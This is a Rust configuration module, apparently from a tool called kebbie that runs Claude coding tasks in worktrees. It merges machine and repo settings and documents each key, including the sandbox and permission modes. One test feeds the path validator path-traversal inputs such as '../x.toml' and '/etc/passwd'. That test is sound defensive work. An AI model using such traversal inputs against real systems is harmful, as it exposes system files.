    Ok(Machine { keys: keys(&table).map_err(fail)?, sources, groups, ongoing, channel: update(&table).map_err(fail)?, restart: restart(&table).map_err(fail)?, keeper: enabled_in(&table, "keeper").map_err(fail)?, recover: enabled_in(&table, "recover").map_err(fail)?, machine_name: machine_name(&table).map_err(fail)?, hub_url: hub_url(&table).map_err(fail)?, report: report(&table).map_err(fail)?, propose_issues: propose_issues(&table).map_err(fail)?, worktree })
}

const MACHINE_WIDE: &str = "applies to every repo, so it lives in config.toml";

// The [[actions]] are actions.rs's to check.
pub fn parse_repo(text: &str, source: &str) -> Result<Worktree> {
    let table = table(text, source)?;
    let fail = |error: String| format!("{source}: {error}");
    for (key, setting) in [("board", "[board] groups and [board.backlog] sources and ongoing"), ("notify", "[notify] command"), ("update", "[update] channel"), ("vault", "[vault] command"), ("restart", "[restart] idle_minutes and auto"), ("keeper", "[keeper] enabled"), ("recover", "[recover] enabled"), ("machine", "[machine] name"), ("hub", "[hub] url"), ("keys", "[keys]"), ("report", "[report] signals, text and inbox_token"), ("issues", "[issues] propose")] {
        if table.contains_key(key) {
            return Err(fail(format!("{key}: {MACHINE_WIDE}; set {setting} in {}", path().display())));
        }
    }
    let worktree = layers(&table).map_err(fail)?;
    let repo = Path::new(source).file_stem().map(|stem| stem.to_string_lossy().to_string());
    crate::routines::parse_list(&table, repo.as_deref(), source).map_err(fail)?;
    if worktree.server_name.is_some() || worktree.worker_name.is_some() {
        return Err(fail(format!("worktree.server_name and worker_name: {MACHINE_WIDE}, since the sidebar names every Space's server and worker alike; set them in {}", path().display())));
    }
    Ok(worktree)
}

fn pick<T: Clone>(repo: Option<&T>, machine: Option<&T>) -> Option<Setting<T>> {
    match (repo, machine) {
        (Some(value), _) => Some(Setting { value: value.clone(), layer: Layer::Repo }),
        (None, Some(value)) => Some(Setting { value: value.clone(), layer: Layer::Machine }),
        (None, None) => None,
    }
}

fn or_default<T>(setting: Option<Setting<T>>, value: T) -> Setting<T> {
    setting.unwrap_or(Setting { value, layer: Layer::Default })
}

pub fn settings(repo: &Worktree, machine: &Machine) -> Settings {
    let optional = |setting: Option<Setting<String>>| or_default(setting.map(|setting| Setting { value: Some(setting.value), layer: setting.layer }), None);
    Settings {
        sources: or_default(pick(None, machine.sources.as_ref()), vec![Source::Local]),
        groups: pick(None, machine.groups.as_ref()).map_or(Setting { value: Group::ALL.to_vec(), layer: Layer::Default }, |setting| Setting { value: group_order(&setting.value), layer: setting.layer }),
        ongoing: or_default(pick(None, machine.ongoing.as_ref()), OngoingAt::default()),
        setup_skill: or_default(pick(repo.setup_skill.as_ref(), machine.worktree.setup_skill.as_ref()), DEFAULT_SETUP_SKILL.to_string()),
        setup_command: optional(pick(repo.setup_command.as_ref(), machine.worktree.setup_command.as_ref())),
        dev_server: optional(pick(repo.dev_server.as_ref(), machine.worktree.dev_server.as_ref())),
        dev_worker: optional(pick(repo.dev_worker.as_ref(), machine.worktree.dev_worker.as_ref())),
        dev_url: or_default(pick(repo.dev_url.as_ref(), machine.worktree.dev_url.as_ref())
            .map(|setting| Setting { value: Some(setting.value).filter(|url| !url.is_empty()), layer: setting.layer }), Some(DEFAULT_DEV_URL.to_string())),
        dev_route: or_default(pick(repo.dev_route.as_ref(), None), false),
        stage_on_main: or_default(pick(repo.stage_on_main.as_ref(), None), false),
        rules_skill: or_default(pick(repo.rules_skill.as_ref(), machine.worktree.rules_skill.as_ref()), DEFAULT_RULES_SKILL.to_string()),
        test_commands: or_default(pick(repo.test_commands.as_ref(), machine.worktree.test_commands.as_ref()), Vec::new()),
        also_noticed: or_default(pick(repo.also_noticed.as_ref(), machine.worktree.also_noticed.as_ref()), AlsoNoticed::default()),
        permission_mode: optional(pick(repo.permission_mode.as_ref(), machine.worktree.permission_mode.as_ref())),
        profile: optional(pick(repo.profile.as_ref(), machine.worktree.profile.as_ref())),
        sandbox: or_default(pick(repo.sandbox.as_ref(), machine.worktree.sandbox.as_ref()), true),
        steps: or_default(pick(repo.steps.as_ref(), machine.worktree.steps.as_ref()), true),
        review_model: optional(pick(repo.review_model.as_ref(), machine.worktree.review_model.as_ref())),
        notify_command: optional(pick(None, machine.worktree.notify_command.as_ref())),
        vault_command: optional(pick(None, machine.worktree.vault_command.as_ref())),
        server_name: or_default(pick(None, machine.worktree.server_name.as_ref()), DEFAULT_SERVER_NAME.to_string()),
        worker_name: or_default(pick(None, machine.worktree.worker_name.as_ref()), DEFAULT_WORKER_NAME.to_string()),
        channel: or_default(pick(None, machine.channel.as_ref()), Channel::default()),
        idle_minutes: or_default(pick(None, machine.restart.idle_minutes.as_ref()), DEFAULT_IDLE_MINUTES),
        auto_restart: or_default(pick(None, machine.restart.auto.as_ref()), true),
        ci_watch: or_default(pick(repo.ci_watch.as_ref(), machine.worktree.ci_watch.as_ref()), true),
        comments_watch: or_default(pick(repo.comments_watch.as_ref(), machine.worktree.comments_watch.as_ref()), true),
        comments_days: or_default(pick(repo.comments_days.as_ref(), machine.worktree.comments_days.as_ref()), crate::comments::DEFAULT_DAYS),
        clean_on_release: or_default(pick(repo.clean_on_release.as_ref(), machine.worktree.clean_on_release.as_ref()), vec!["target".to_string()]),
        docs_required: or_default(pick(repo.docs_required.as_ref(), None), false),
        keeper: or_default(pick(None, machine.keeper.as_ref()), true),
        recover: or_default(pick(None, machine.recover.as_ref()), true),
        machine_name: pick(None, machine.machine_name.as_ref()).unwrap_or_else(|| Setting { value: short_hostname(), layer: Layer::Default }),
        hub_url: or_default(pick(None, machine.hub_url.as_ref()), DEFAULT_HUB_URL.to_string()),
        report_signals: or_default(pick(None, machine.report.signals.as_ref().or(machine.report.enabled.as_ref())), true),
        report_text: or_default(pick(None, machine.report.text.as_ref().or((machine.report.enabled == Some(false)).then_some(&ReportText::Never))), ReportText::Ask),
        report_inbox: or_default(pick(None, machine.report.inbox_token.as_ref().map(|_| &true)), false),
        propose_issues: or_default(pick(None, machine.propose_issues.as_ref()), true),
    }
}

// A command naming a path applies only in a repo that has that file, so one machine-wide value leaves other repos on the default setup.
pub fn setup_command_in(command: Option<String>, repo: &Path) -> Option<String> {
    command.filter(|command| {
        let program = command.split_whitespace().next().unwrap_or(command);
        !program.contains('/') || repo.join(program).exists()
    })
}

pub fn resolve(repo: Option<&Path>) -> Result<Loaded> {
    resolve_file(repo.map(repo_file))
}

pub fn resolve_file(repo: Option<PathBuf>) -> Result<Loaded> {
    resolve_at(path(), repo)
}

pub fn resolve_at(machine: PathBuf, repo: Option<PathBuf>) -> Result<Loaded> {
    let own = repo.as_deref().map(load_repo).transpose()?.unwrap_or_default();
    Ok(Loaded { settings: settings(&own, &load_machine(&machine)?), machine, repo })
}

pub fn sources() -> Result<Vec<Source>> {
    Ok(resolve(None)?.settings.sources.value)
}

pub fn board_layout() -> Result<(Vec<Group>, OngoingAt)> {
    let settings = resolve(None)?.settings;
    Ok((settings.groups.value, settings.ongoing.value))
}

pub fn restart_settings() -> Result<(bool, u64)> {
    let settings = resolve(None)?.settings;
    Ok((settings.auto_restart.value, settings.idle_minutes.value))
}

pub fn propose_issues_enabled() -> Result<bool> {
    Ok(load_machine(&path())?.propose_issues.unwrap_or(true))
}

pub fn keeper_enabled() -> Result<bool> {
    Ok(load_machine(&path())?.keeper.unwrap_or(true))
}

pub fn recover_enabled() -> Result<bool> {
    Ok(load_machine(&path())?.recover.unwrap_or(true))
}

// The name other machines on the same vault see this kebbie's claims under.
pub fn machine() -> String {
    load_machine(&path()).ok().and_then(|machine| machine.machine_name).unwrap_or_else(short_hostname)
}

pub fn report_settings() -> Result<Report> {
    Ok(load_machine(&path())?.report)
}

pub fn channel() -> Result<Channel> {
    channel_in(&path())
}

// kebbie update reads only [update] channel, so nothing else in config.toml can keep a machine from updating.
pub fn channel_in(path: &Path) -> Result<Channel> {
    let source = path.display().to_string();
    let Some(text) = read(path)? else { return Ok(Channel::default()) };
    update(&table(&text, &source)?).map(Option::unwrap_or_default).map_err(|error| format!("{source}: {error}"))
}

fn quoted(items: &[&str]) -> String {
    format!("[{}]", items.iter().map(|item| format!("{item:?}")).collect::<Vec<_>>().join(", "))
}

// The one list of keys: kebbie config prints it and the Settings page edits it.
pub fn entries(loaded: &Loaded) -> Vec<Entry> {
    let Settings { sources, groups, ongoing, setup_skill, setup_command, dev_server, dev_worker, dev_url, dev_route, stage_on_main, rules_skill, test_commands, also_noticed, permission_mode, profile, sandbox, steps, review_model, notify_command, vault_command, server_name, worker_name, channel, idle_minutes, auto_restart, ci_watch, comments_watch, comments_days, clean_on_release, docs_required, keeper, recover, machine_name, hub_url, report_signals, report_text, report_inbox, propose_issues } = &loaded.settings;
    let names: Vec<&str> = sources.value.iter().map(|source| source.key()).collect();
    let (board_keys, _) = crate::keys::Keys::with(&load_machine(&loaded.machine).map(|machine| machine.keys).unwrap_or_default());
    let (server_key, worker_key) = (board_keys.char(crate::keys::Act::Server), board_keys.char(crate::keys::Act::Worker));
    let mut entries = Vec::new();
    let mut key = |key: &'static str, value: String, layer: Layer, kind: Kind, scope: Scope, about: &str| {
        entries.push(Entry { key, value, layer, kind, scope, about: about.to_string() });
    };
    key("board.backlog.sources", quoted(&names), sources.layer, Kind::List, Scope::Machine,
        "Where the board's Backlog tab finds work: \"local\" (backlog.md next to the machine config), \"vault\" and \"linear\", in any combination; config.toml only.");
    key("board.backlog.ongoing", format!("{:?}", ongoing.value.key()), ongoing.layer, Kind::Choice(OngoingAt::ALL.map(OngoingAt::key).to_vec()), Scope::Machine,
        "Where the Backlog column shows ONGOING, the vault notes in progress: \"top\" above the backlog, \"bottom\" below it, \"hidden\" not at all; config.toml only.");
    let order: Vec<&str> = groups.value.iter().map(|group| group.key()).collect();
    key("board.groups", quoted(&order), groups.layer, Kind::List, Scope::Machine,
        &format!("The order of the Work column's groups, by name: {}; groups the list leaves out follow in this default order, so a partial list moves only the ones it names; config.toml only.", quoted(&Group::ALL.map(Group::key))));
    key("worktree.setup_skill", format!("{:?}", setup_skill.value), setup_skill.layer, Kind::Skill, Scope::Either,
        "The skill a task's Claude runs first to make its worktree runnable: kebbie's own, a skill of yours by name (<skill> or <plugin>:<skill>), or a Markdown file by an absolute or ~ path, whose text the task gets in its role.");
    key("worktree.setup_command", setup_command.value.as_ref().map_or("none".to_string(), |command| format!("{command:?}")), setup_command.layer, Kind::Text, Scope::Either,
        "The repo's own command that prepares an existing worktree, run from inside it; the setup skill runs it. A path applies only in a repo that has the file; elsewhere, and when none, bin/setup-worktree when the repo has one.");
    key("worktree.dev_server", dev_server.value.as_ref().map_or("none".to_string(), |command| format!("{command:?}")), dev_server.layer, Kind::Text, Scope::Either,
        &format!("The shell command the board's {server_key} key runs in a server tab of the task's Space, with PORT set to the worktree's port; without one there is no {server_key}."));
    key("worktree.dev_worker", dev_worker.value.as_ref().map_or("none".to_string(), |command| format!("{command:?}")), dev_worker.layer, Kind::Text, Scope::Either,
        &format!("A second command, such as a job runner, the board's {worker_key} key runs in a worker tab of the task's Space, with the same PORT; without one there is no {worker_key}."));
    key("worktree.dev_url", dev_url.value.as_ref().map_or("\"\" (no link)".to_string(), |url| format!("{url:?}")), dev_url.layer, Kind::Text, Scope::Either,
        "The running dev server's address, shown on the board as a link: {worktree} (the worktree's folder), {repo}, {number} (its pool number) and {port} (its port) are filled in; a worktree without what it names gets no link, and \"\" turns the link off.");
    key("worktree.dev_route", dev_route.value.to_string(), dev_route.layer, Kind::Bool, Scope::Repo,
        "Whether kebbie routes writes a Caddy site for each of this repo's worktrees, at the host its dev_url names, proxied to the worktree's port; for a dev server on a remote machine opened in your laptop's browser. Off unless the repo turns it on; repo config only.");
    key("worktree.stage_on_main", stage_on_main.value.to_string(), stage_on_main.layer, Kind::Bool, Scope::Repo,
        "Whether kebbie stage may put a ready task's commits on this repo's local default branch, unpushed, so you can try them from the main checkout before you push main; for a repo you run from its main checkout, such as kebbie's own. Off unless the repo turns it on; repo config only.");
    key("worktree.server_name", format!("{:?}", server_name.value), server_name.layer, Kind::Text, Scope::Machine,
        &format!("The name of the tab the board's {server_key} starts the dev server in, and of the Space's tag in herdr's sidebar while it runs; config.toml only."));
    key("worktree.worker_name", format!("{:?}", worker_name.value), worker_name.layer, Kind::Text, Scope::Machine,
        &format!("The same for the worker tab {worker_key} starts; config.toml only."));
    let cleaned: Vec<&str> = clean_on_release.value.iter().map(String::as_str).collect();
    key("worktree.clean_on_release", quoted(&cleaned), clean_on_release.layer, Kind::List, Scope::Either,
        "Build output kebbie removes from a worktree when it goes back to the pool (done, drop, reset, a landed task closing), so the pool's disk use stays bounded; folders inside the worktree, each removed only when git ignores it and tracks nothing in it, and \"target\" only where the worktree has a Cargo.toml. [] keeps everything.");
    key("task.rules_skill", format!("{:?}", rules_skill.value), rules_skill.layer, Kind::Skill, Scope::Either,
        "The skill with the rules for how work is planned, built and committed; a task's Claude follows it, the reviewer checks a ready task against it, tidy reshapes commits by it. kebbie's own, a skill of yours by name (<skill> or <plugin>:<skill>), or a Markdown file by an absolute or ~ path, whose text the task and the reviewer get.");
    let own: Vec<&str> = test_commands.value.iter().map(String::as_str).collect();
    key("task.test_commands", quoted(&own), test_commands.layer, Kind::List, Scope::Either,
        &format!("Test commands of this repo that kebbie records when a task's Claude runs them, on top of the built-in {}; matched on the command's start, after any cd … && and VAR=value. kebbie evidence, the board, the push dialog and the reviewer show the runs.", quoted(&crate::evidence::DEFAULT_COMMANDS)));
    key("task.also_noticed", format!("{:?}", also_noticed.value.key()), also_noticed.layer, Kind::Choice(AlsoNoticed::ALL.map(AlsoNoticed::key).to_vec()), Scope::Either,
        "What a task's Claude does with what it notices outside its task (a bug nearby, a stale doc, a refactor): \"backlog\" files it, in the vault's backlog with the vault plugin, else with kebbie backlog add; \"fix\" fixes a small related one in a commit of its own and files the rest; \"ask\" puts each to you with kebbie ask first. Each is listed under Also noticed on the sign-off card, and the reviewer counts an unrelated change under \"backlog\" or \"ask\" as a finding.");
    key("task.permission_mode", permission_mode.value.as_ref().map_or("none".to_string(), |mode| format!("{mode:?}")), permission_mode.layer, Kind::Choice(std::iter::once("none").chain(PERMISSION_MODES).collect()), Scope::Either,
        &format!("The permission mode a task's Claude starts in, one of {}; none leaves it to Claude's own default. kebbie start --mode overrides it for one task, and a restarted task keeps the mode it started in. \"bypassPermissions\" runs every tool without asking, for an isolated machine only; a task still never pushes nor approves its own commits.", quoted(&PERMISSION_MODES)));
    key("task.profile", profile.value.as_ref().map_or(format!("none ({:?})", crate::profiles::TASK), |profile| format!("{profile:?}")), profile.layer, Kind::Text, Scope::Either,
        &format!("The profile a task starts with when kebbie start names none with --profile: a file in {}/<name>.toml with the agent, model, extra role, skills, permission mode and rules it adds to kebbie's own; none starts the built-in task. A restarted task keeps the profile it started with; kebbie profiles lists them.", crate::profiles::dir().display()));
    key("task.sandbox", sandbox.value.to_string(), sandbox.layer, Kind::Bool, Scope::Either,
        &format!("Whether a task's and the reviewer's shell commands run in Claude Code's sandbox: writes only in the worktree, the task's temp folder and {}, network only to {} and a profile's own hosts, no Unix sockets; kebbie's own task commands ({}) run outside it, and kebbie refuses its user-only commands to a sandboxed process. On Linux it needs bubblewrap, socat and the seccomp filter, or kebbie refuses to start tasks; false runs them unsandboxed, where a task can pass as you to kebbie's user-only commands. A profile's [sandbox] enabled wins over it.", crate::sandbox::WRITES.join(", "), crate::sandbox::DOMAINS.join(", "), crate::sandbox::TASK_COMMANDS.join(", ")));
    key("task.steps", steps.value.to_string(), steps.layer, Kind::Bool, Scope::Either,
        "Tasks work in steps, one commit each, listed with kebbie steps before they write code: you accept and push one step at a time while the task builds the next. Off, a task commits its own way and kebbie steps refuses. New tasks follow it; a running task once it restarts.");
    key("review.model", review_model.value.as_ref().map_or("none".to_string(), |model| format!("{model:?}")), review_model.layer, Kind::Text, Scope::Either,
        "The model kebbie review's independent reviewer runs on, ahead of the reviewer profile's model; none leaves it to that profile, then to Claude's default.");
    key("notify.command", notify_command.value.as_ref().map_or("none".to_string(), |command| format!("{command:?}")), notify_command.layer, Kind::Text, Scope::Machine,
        "The shell command kebbie runs when something needs you (a task needs you or is ready, a question waits, the lead's summary); KEBBIE_EVENT, KEBBIE_TASK, KEBBIE_REPO and KEBBIE_TEXT describe it, and $1 is the text. None sends no notifications; config.toml only.");
    key("vault.command", vault_command.value.as_ref().map_or("none".to_string(), |command| format!("{command:?}")), vault_command.layer, Kind::Text, Scope::Machine,
        "The notes-vault-mcp command kebbie writes task notes and log lines with, before its own arguments (task open, log append, ...); none runs the vault plugin's own pinned command from its hooks. Used only while the vault plugin is installed and enabled; config.toml only.");
    key("ci.watch", ci_watch.value.to_string(), ci_watch.layer, Kind::Bool, Scope::Either,
        "Whether kebbie watches GitHub Actions after a push and keeps the task open under CI running until every run for the pushed commit is green; a failed run moves the task to Needs you and its Claude gets the failing job's log. Needs origin on GitHub and gh logged in; false closes the task right after the push. A repo config can turn it off for one repo.");
    key("comments.watch", comments_watch.value.to_string(), comments_watch.layer, Kind::Bool, Scope::Either,
        "Whether kebbie watches the GitHub comments colleagues leave on the commits it pushed, reads each one independently with a read-only Claude, and shows it under COMMENTS on the board with a recommendation and a reply to send; kebbie never posts a reply. Needs origin on GitHub and gh logged in, as ci.watch does; your own comments are skipped. A repo config can turn it off for one repo.");
    key("comments.watch_days", comments_days.value.to_string(), comments_days.layer, Kind::Number, Scope::Either,
        "How many days after a push kebbie keeps checking its commits for new comments, asking gh once per repo every 12 minutes, or less often while gh fails; 1 to 90. A comment already on the board stays there until you mark its reply sent or dismiss it.");
    key("docs.required", docs_required.value.to_string(), docs_required.layer, Kind::Bool, Scope::Repo,
        "Whether this repo's docs must keep in step with its code: a task's Claude updates the README and docs/ when its change alters what a user sees or does, by the skill kebbie:keep-docs, and the reviewer fails a branch that changes such behaviour and leaves it undescribed in the README or docs/. Off unless the repo turns it on; repo config only. kebbie doctor suggests it for a public GitHub repo.");
    key("update.channel", format!("{:?}", channel.value.key()), channel.layer, Kind::Choice(vec![Channel::Release.key(), Channel::Main.key()]), Scope::Machine,
        "What kebbie update installs on this machine: \"release\", the highest vX.Y.Z tag on origin whose release binary is published; \"main\", origin's default branch as it is pushed. kebbie update --from <branch or path> runs other code until kebbie update --stable; config.toml only.");
    key("restart.auto", auto_restart.value.to_string(), auto_restart.layer, Kind::Bool, Scope::Machine,
        "Whether kebbie restarts the Claude sessions that run older code than is installed, after kebbie updates or a new Claude Code, plugin or MCP config is installed; no other session is ever restarted. Each resumes its conversation with claude --resume in its own pane, keeping its flags, and kebbie update restarts the idle ones at once. false restarts nothing on its own: the board still marks those sessions, and kebbie restart restarts them when you want; config.toml only.");
    key("restart.idle_minutes", idle_minutes.value.to_string(), idle_minutes.layer, Kind::Number, Scope::Machine,
        "How long a session that runs older code than is installed waits to be idle and out of focus before kebbie restarts it; a session mid-turn, the pane you are in and one with background work running are never restarted on their own; config.toml only.");
    key("keeper.enabled", keeper.value.to_string(), keeper.layer, Kind::Bool, Scope::Machine,
        "Whether one background kebbie keeper per machine runs the routines (stale-session restarts, the update check, held messages, delivery checks of typed prompts, scheduled [[routines]]), so they go on with the board closed; herdr's startup, the board and kebbie update start it. false runs them in an open board instead; config.toml only.");
    key("recover.enabled", recover.value.to_string(), recover.layer, Kind::Bool, Scope::Machine,
        "Whether kebbie resumes a task whose Claude an API error stopped: after overload, a server error, a rate limit or a dropped connection it says carry on after 1, 2, 4 and 8 minutes; after a usage limit, once the allowance resets. A login, billing, invalid request or refusal error goes to you under Needs you at once. false leaves every such task idle; config.toml only.");
    key("machine.name", format!("{:?}", machine_name.value), machine_name.layer, Kind::Text, Scope::Machine,
        "The machine's one name: your phone shows it through the hub, and kebbie claims vault notes under it; kebbie hub connect and kebbie hub join use it, set it from --name or ask for it when unset. A task started from a vault note writes it with the task's name into the note's kebbie frontmatter key, and kebbie on another machine sharing the vault shows the note as worked on at this name and asks before starting it; the default is the host's short name. config.toml only.");
    key("hub.url", format!("{:?}", hub_url.value), hub_url.layer, Kind::Text, Scope::Machine,
        "The hub kebbie hub connect and the board's hub window connect this machine to: the kebbie hub unless set, or your own kebbie hub at an https address (http only on this machine). Choosing your own hub there sets it; the hub a machine is connected to stays in kebbie's state with its keys, so changing this key later moves nothing (kebbie hub move does). config.toml only.");
    key("report.signals", report_signals.value.to_string(), report_signals.layer, Kind::Bool, Scope::Machine,
        "Whether kebbie sends its maintainers error signals, counts of kebbie's own failures: when kebbie itself fails (a panic, and some internal errors), the keeper sends at most once a day a count per failure with only kebbie's version and commit, the OS and CPU architecture, the component (a fixed name from kebbie's code, such as keeper.push) and the error kind (panic, internal-error, corrupt-state). Never an error message, path, repo, task or host name. Each send is a line under messages on the board; false sends none and drops what was counted; config.toml only.");
    key("report.text", format!("{:?}", report_text.value.key()), report_text.layer, Kind::Choice(ReportText::ALL.map(ReportText::key).to_vec()), Scope::Machine,
        "What happens to a bug in kebbie you ran into, once you or the lead saved it, with its text redacted (paths under your home as ~, no repo names, remote URLs or tokens): \"ask\" shows it on the board as it would go to kebbie's maintainers and only your yes sends it; \"always\" sends it without asking, and says so under messages, once you arm it with kebbie issue report --always in your own terminal (until then it asks); \"never\" keeps it on this machine, though kebbie issue report <id> still sends one when you ask. Signed with this install's key; config.toml only.");
    key("report.inbox_token", if report_inbox.value { "set".to_string() } else { "none".to_string() }, report_inbox.layer, Kind::Secret, Scope::Machine,
        "For kebbie's maintainers: the kha_ token the issues endpoint issued. With it the keeper fetches the reports the endpoint lets through every 10 minutes, files each as a kebbie issue and acknowledges it, and kebbie doctor counts the ones waiting in quarantine; never in a repo config, and never shown.");
    key("issues.propose", propose_issues.value.to_string(), propose_issues.layer, Kind::Bool, Scope::Machine,
        "Whether the lead proposes saving a bug or wish about kebbie when kebbie itself cost something (an error, a workaround, a missing capability), one per turn at most, and saves it on your yes; false keeps the lead from proposing or filing them, and it files one only when you ask it to. Takes effect when the lead next restarts (L on the board); config.toml only.");
    entries
}

pub fn describe(loaded: &Loaded) -> String {
    let repo = match &loaded.repo {
        Some(path) => shown(path),
        None => "none: not in a git repo (--repo <path> names one)".to_string(),
    };
    let mut lines: Vec<String> = [
        ("repo config", repo),
        ("machine config", shown(&loaded.machine)),
        ("defaults", "built in".to_string()),
    ].into_iter().map(|(layer, file)| format!("{:<16}{file}", format!("{layer}:"))).collect();
    lines.push(String::new());
    lines.push(format!("Each key below may be set in config.toml or, for one repo, in {}/<repo>.toml (named after the main checkout's folder), which wins; a key marked config.toml only applies to every repo.", repos_dir().display()));
    lines.push(String::new());
    lines.extend(entries(loaded).iter().flat_map(|entry| [format!("{} = {}  ({})", entry.key, entry.value, entry.layer.label()), format!("  {}", entry.about)]));
    let (board_keys, key_errors) = crate::keys::Keys::with(&load_machine(&loaded.machine).map(|machine| machine.keys).unwrap_or_default());
    lines.push("[keys]  (config.toml only)\n  The board's keys, as name = \"key\" by action: a plain character for an action whose key is one (esc, ctrl+c, ⏎, the arrows and tab stay), and one not taken by another action where both act; moving two at once in the table works. An entry that breaks a rule is ignored, and named below. Help, hints and messages show the key in effect.".to_string());
    lines.extend(board_keys.describe(&key_errors).into_iter().map(|line| format!("  {line}")));
    lines.push(format!("[[routines]]  (config.toml or a repo config)\n  Checks kebbie runs on a schedule, each as a task that reports, plans or fixes, one table each with the keys {}; a repo config's run in its repo, one in config.toml names its repo. Listed below are config.toml's and this repo's; kebbie routines lists every one with its next run, and docs/reference/configuration.md shows each key.", crate::routines::KEYS.join(", ")));
    let repo_file = loaded.repo.clone().map(|file| { let stem = file.file_stem().map(|stem| stem.to_string_lossy().to_string()); (file, stem) });
    let (routines, errors) = crate::routines::load_files([(loaded.machine.clone(), None)].into_iter().chain(repo_file).collect());
    lines.extend(routines.iter().map(|routine| format!("  {}: {} in {}, {}{}", routine.id, routine.schedule.text(), routine.repo, routine.mode.key(), if routine.enabled { "" } else { ", off" })));
    lines.extend(errors.iter().map(|error| format!("  ignored: {error}")));
    lines.push(format!("[[actions]]  (repo config only)\n  The Areas page's own actions for the repo, one table each, with the keys {}; docs/reference/configuration.md shows each.", crate::actions::ACTION_KEYS.join(", ")));
    lines.join("\n")
}

// For scripts such as the sidebar sync: one machine-wide setting's value, plain.
pub fn get(key: &str) -> Result<String> {
    let settings = resolve(None)?.settings;
    match key {
        "worktree.server_name" => Ok(settings.server_name.value),
        "worktree.worker_name" => Ok(settings.worker_name.value),
        other => Err(format!("kebbie config --get knows worktree.server_name and worktree.worker_name, not {other}")),
    }
}

pub fn show(cwd: &Path, repo: Option<&str>) -> Result<String> {
    let repo = match repo {
        Some(path) => {
            let path = PathBuf::from(path);
            main_checkout(&path).map_err(|_| format!("--repo {}: not a git repository", path.display()))?;
            Some(path)
        }
        None => main_checkout(cwd).ok().map(|_| cwd.to_path_buf()),
    };
    Ok(format!("{}\n{}", describe(&resolve(repo.as_deref())?), crate::hub::config_line(crate::lead::state_location().ok().as_deref())))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn keys_live_in_config_toml_only_and_kebbie_config_shows_each_with_why_an_entry_was_ignored() {
        let config = machine("[keys]\ninbox = \"I\"\nchat = \"p\"\nback = \"x\"\nnew = 3\n");
        assert_eq!(config.keys, [("back".to_string(), "x".to_string()), ("chat".to_string(), "p".to_string()), ("inbox".to_string(), "I".to_string()), ("new".to_string(), "integer value".to_string())]);
        let refused = parse_repo("[keys]\ninbox = \"I\"\n", "app.toml").unwrap_err();
        assert!(refused.contains("keys: applies to every repo, so it lives in config.toml; set [keys] in"), "{refused}");
        let dir = crate::sh::test_dir("config-keys");
        let file = dir.join("config.toml");
        std::fs::write(&file, "[keys]\ninbox = \"I\"\nchat = \"p\"\nserver = \"W\"\n").unwrap();
        let shown = describe(&Loaded { machine: file, repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
        assert!(shown.contains("keys.inbox = \"I\"  (machine config)") && shown.contains("keys.new = \"n\"  (default)"), "{shown}");
        assert!(shown.contains("ignored: keys.chat: p is taken by push"), "{shown}");
        assert!(shown.contains("the board's W key runs in a server tab"), "the descriptions name the key in effect: {shown}");
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn kebbie_config_describes_the_routines_and_lists_config_tomls_and_the_repos() {
        let dir = crate::sh::test_dir("config-routines");
        let (file, repo) = (dir.join("config.toml"), dir.join("app.toml"));
        std::fs::write(&file, "[[routines]]\nid = \"disk\"\ntitle = \"Disk\"\nrepo = \"~/code/infra\"\nat = \"07:00\"\nprompt = \"p\"\n").unwrap();
        std::fs::write(&repo, "[[routines]]\nid = \"deps\"\ntitle = \"Updates\"\nat = \"mon 07:00\"\nprompt = \"p\"\nmode = \"plan\"\nenabled = false\n").unwrap();
        let shown = describe(&Loaded { machine: file, repo: Some(repo), settings: settings(&Worktree::default(), &Machine::default()) });
        assert!(shown.contains("[[routines]]  (config.toml or a repo config)\n  Checks kebbie runs on a schedule") && shown.contains("with the keys id, title, repo, every, at, prompt, mode, push, enabled"), "{shown}");
        assert!(shown.contains("\n  disk: daily at 07:00 in ~/code/infra, report\n  deps: mon at 07:00 in app, plan, off\n"), "{shown}");
        let _ = std::fs::remove_dir_all(dir);
    }

    const MACHINE: &str = "[board.backlog]\nsources = [\"vault\", \"linear\"]\n\n[worktree]\nsetup_skill = \"my-tools:set-up-worktree\"\ndev_server = \"bin/dev\"\n";
    const REPO: &str = "[worktree]\nsetup_skill = \"app-tools:set-up-worktree\"\ndev_server = \"npm run dev\"\n\n[[actions]]\nkey = \"B\"\ntitle = \"Build\"\nrun = \"cargo build\"\n";

    fn machine(text: &str) -> Machine {
        parse_machine(text, "config.toml").unwrap()
    }

    fn repo(text: &str) -> Worktree {
        parse_repo(text, "app.toml").unwrap()
    }

    fn unknown_machine(text: &str) -> String {
        machine(text);
        unknown_in_file(text, "config.toml", &MACHINE_KEYS).join("\n")
    }

    fn unknown_repo(text: &str) -> String {
        repo(text);
        unknown_in_file(text, "app.toml", &REPO_KEYS).join("\n")
    }

    #[test]
    fn a_repo_configs_paths_and_skill_names_stay_inside_their_folders() {
        for good in ["pyproject.toml", "crates/app/Cargo.toml", "./uv.lock"] {
            assert!(inside(good), "{good}");
        }
        for bad in ["", "../x.toml", "a/../../x", "/etc/passwd", "a/.."] {
            assert!(!inside(bad), "{bad}");
        }
        for good in ["work-rules", "kebbie:work-rules", "my-tools:set-up-worktree"] {
            assert!(skill_name(good), "{good}");
        }
        for bad in ["..", "kebbie:..", "kebbie:../../outside", "../../outside", "a/b", "/abs", "x:", ":x", "a:b:c", "a\\b"] {
            assert!(!skill_name(bad), "{bad}");
        }
        for file in ["/home/u/code/team/RULES.md", "~/notes/setup.MD"] {
            assert_eq!(repo(&format!("[task]\nrules_skill = {file:?}\n[worktree]\nsetup_skill = {file:?}\n")).rules_skill.as_deref(), Some(file), "a Markdown file by an absolute or ~ path");
        }
        for not_a_file in ["code/RULES.md", "/home/u/RULES.txt", "~/RULES"] {
            assert!(parse_repo(&format!("[task]\nrules_skill = {not_a_file:?}\n"), "app.toml").unwrap_err().contains("or a path to a .md file starting with / or ~/"), "{not_a_file}");
        }
        assert_eq!(skill_path("kebbie:work-rules"), None);
        assert_eq!(skill_path("/x/RULES.md"), Some(PathBuf::from("/x/RULES.md")));
        assert_eq!(skill_path("~/RULES.md"), Some(PathBuf::from(std::env::var("HOME").unwrap()).join("RULES.md")));
        assert_eq!((follow("kebbie:set-up-worktree"), follow("/x/SETUP.md")), ("run the skill `kebbie:set-up-worktree` and follow it".to_string(), "read `/x/SETUP.md` and follow it".to_string()));
        assert_eq!((rules_named("kebbie:work-rules"), rules_named("/x/RULES.md")), ("the skill `kebbie:work-rules`".to_string(), "the rules in `/x/RULES.md`".to_string()));
